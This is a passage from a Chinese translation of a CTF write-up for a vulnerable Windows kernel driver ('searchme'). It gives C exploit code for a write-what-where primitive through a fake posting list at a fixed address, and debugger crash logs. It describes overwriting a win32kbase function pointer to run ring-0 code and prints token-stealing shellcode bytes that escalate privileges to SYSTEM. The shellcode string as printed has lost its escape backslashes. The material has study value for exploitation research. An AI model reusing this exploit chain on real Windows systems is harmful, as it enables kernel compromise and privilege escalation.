@@ -1,0 +1,99 @@
+    };
+在许多方面，上面的数据结构类似于C++中的std：map结构。
+当程序请求向索引中添加一个新的(token, value)对时，代码遍历slots
+数组以查找与所提供的token相对应的posting列表，一旦找到，输入值将用以下表达式追加到列表中， 并带有以下表达式：
+    PostingList.data[PostingList.size++] = value;
+考虑到Token表在我们的控制下， `_ii_posting_list.size`
+字段是64位宽的，并且我们知道假posting列表的基址，这种行为转换为任意写基元是非常简单的。
+首先，我们在静态内存中声明假的posting列表，其中有一个已知的名称(“fake”) 和容量等于`UINT64_MAX`:
+    namespace globals {
+    _ii_posting_list PostingList = { "fake", 0, 0xFFFFFFFFFFFFFFFFLL };
+    }  // namespace globals
+然后，我们编写一个函数来初始化特殊0x0000056c00000558地址的伪token表：
+    BOOLEAN SetupWriteWhatWhere() {
+      CONST PVOID kTablePointer = (PVOID)0x0000056c00000558;
+      CONST PVOID kTableBase = (PVOID)0x0000056c00000000;
+      if (VirtualAlloc(kTableBase, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) == NULL) {
+        printf("[-] Unable to allocate fake base.n");
+        return FALSE;
+      }
+      _ii_token_table *TokenTable = (_ii_token_table *)kTablePointer;
+      TokenTable->size = 1;
+      TokenTable->capacity = 1;
+      TokenTable->slots[0] = &globals::PostingList;
+      return TRUE;
+    }
+最后，我们添加一个助手函数来触发4字节任意写条件：
+    VOID WriteWhatWhere4(ULONG_PTR CorruptedIndex, ULONG_PTR Where, DWORD What) {
+      globals::PostingList.size = (Where - (ULONG_PTR)&globals::PostingList.data) / sizeof(DWORD);
+      AddToIndex(CorruptedIndex, What, "fake");
+    }
+有了这些，我们就可以测试它的工作原理：
+    WriteWhatWhere4(CorruptedIndex, 0x4141414141414141LL, 0x42424242);
+这将在易受攻击的驱动程序中触发以下异常：
+    CONTEXT:  ffff9609683dacb0 -- (.cxr 0xffff9609683dacb0)
+    rax=00007ff6a90b2930 rbx=ffffe48f8135b5a0 rcx=10503052a60d85fc
+    rdx=0000000042424242 rsi=ffffe48f82d7d70c rdi=ffff9609683db7d4
+    rip=fffff8038ccc1905 rsp=ffff9609683db6a0 rbp=ffffe48f82c79ef0
+     r8=0000000000000001  r9=0000000000000014 r10=0000000000000000
+    r11=0000000000000000 r12=ffffe48f82c79ef0 r13=ffffe48f81382ac0
+    r14=0000000000000002 r15=0000000000000000
+    iopl=0         nv up ei pl nz na po nc
+    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+    searchme+0x1905:
+    fffff803`8ccc1905 3954881c        cmp     dword ptr [rax+rcx*4+1Ch],edx ds:002b:41414141`4141413c=????????
+上面的崩溃日志并不能完全说明“写”操作，因为之前的一些无意义的阅读清单。数据，但攻击是有效的。
+## 执行shellcode
+在这一点上，我可以写任意的内核内存但是不能读，这就排除了直接从用户模式执行[data-only
+attacks](https://improsec.com/blog/data-only-attacks-are-still-alive) 的选项。
+然而，使用任意写的基元，执行ring-0 shellcode 应该只是一种形式
+。在这种情况下，它变得更容易了，因为这个漏洞是在Medium完整性的情况下运行的，所以它可以访问内核模块的基本地址，并且可以通过NtQuerySystemInformation
+的[各种信息类](https://recon.cx/2013/slides/Recon2013-Alex%20Ionescu-I%20got%2099%20problems%20but%20a%20kernel%20pointer%20ain't%20one.pdf)获得其他有用的地址。
+在[Black Hat USA 2017
+talk](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf) 中，Morten
+Schenk提出，可以使用任意写入来覆盖驻留在win32kbase.sys
+的.Data部分中的内核函数指针，更具体地说，可以覆盖来自NtGdiDdDDI*系列的图形系统使用的win32kbase！gDxgkInterface表中的内核函数指针。
+实际上，系统调用处理程序是函数指针的简单包装器，并且不会破坏通过rcx、rdx、…寄存器传递的任何参数。，例如：
+这允许攻击者用受控的参数来调用任意的内核函数，并接收返回值。正如Morten所讨论的，完整的利用过程只有几个简单的步骤：
+  1. 用`nt!ExAllocatePoolWithTag`地址覆盖函数指针。
+  2. 使用非`PagedPool`参数调用例程来分配可写/可执行内存。
+  3. 将ring-0 shellcode 写入分配的内存
+  4. 用shellcode的地址覆盖函数指针。
+  5. 调用shellcode.
+上述方案使得能够在不破坏系统状态的情况下干净地执行所需的payload(除了一个覆盖的指针)。在他的论文中，Morten建议使用NtGdiDdDDICreateAllocation作为代理SysCall，
+但是我发现它在Windows中的使用非常频繁，如果指针没有及时修复，系统就会出现故障。为了让我的生活更轻松一点，我选择了一种使用频率较低的服务，它似乎完全被我的exploit所调用：`NtGdiDdDDIGetContextSchedulingPriority`.
+在实现代码中的逻辑之后，我可以享受任意的内核代码执行——在本例中，一个单独的int3指令：
+    kd> g
+    Break instruction exception - code 80000003 (first chance)
+    ffffc689`b8967000 cc              int     3
+    0: kd> u
+    ffffc689`b8967000 cc              int     3
+    ffffc689`b8967001 c3              ret
+    [...]
+    0: kd> !pool @rip
+    Pool page ffffc689b8967000 region is Nonpaged pool
+    *ffffc689b8967000 : large page allocation, tag is ...., size is 0x1000 bytes
+            Owning component : Unknown (update pooltag.txt)
+## 提权
+在Windows中，提高系统权限的一种更简单的方法是“窃取”系统进程的安全Token并将其复制到当前进程(特别是EPROCESS.Token)。
+系统进程的地址可以在ntoskrnl.exe映像的静态内存中找到，位于nt!PsInitialSystemProcess 下面。
+由于攻击只涉及在两个内核结构之间复制一个指针，shellcode 只包含六个指令：
+    // The shellcode takes the address of a pointer to a process object in the kernel in the first
+    // argument (RCX), and copies its security token to the current process.
+    //
+    // 00000000  65488B0425880100  mov rax, [gs:KPCR.Prcb.CurrentThread]
+    // -00
+    // 00000009  488B80B8000000    mov rax, [rax + ETHREAD.Tcb.ApcState.Process]
+    // 00000010  488B09            mov rcx, [rcx]
+    // 00000013  488B8958030000    mov rcx, [rcx + EPROCESS.Token]
+    // 0000001A  48898858030000    mov [rax + EPROCESS.Token], rcx
+    // 00000021  C3                ret
+    CONST BYTE ShellcodeBytes[] = "x65x48x8Bx04x25x88x01x00x00x48x8Bx80xB8x00x00x00"
+                                  "x48x8Bx09x48x8Bx89x58x03x00x00x48x89x88x58x03x00"
+                                  "x00xC3";
+## Getting the flag
+一旦替换了工具过程的安全token，我们就可以完全控制操作系统。我们可以启动一个提升的命令提示符并读取flag：
+总而言之，在大约15个小时的工作之后，这个exploit已经发挥了作用，并为我们的一（也是最后一个）血奖金提供了120分+30分。
+感谢Niklas创造了这个有趣的挑战，也感谢WCTF组织者举办了这次比赛。我认为这个任务和它的解决方案巧妙地说明了即使在今天，从理论上讲，在适当的环境条件下，在内核池中出现的小错误，例如在内核池中溢出的bug可能在概念上很容易被利用。在Windows中，缓冲区溢出的利用还没有死。:)
+提醒，该exploit的完整源代码可以在[GitHub](https://gist.github.com/j00ru/2347cf937366e61598d1140c31262b18)上找到。
+审核人：yiwang 编辑：边边
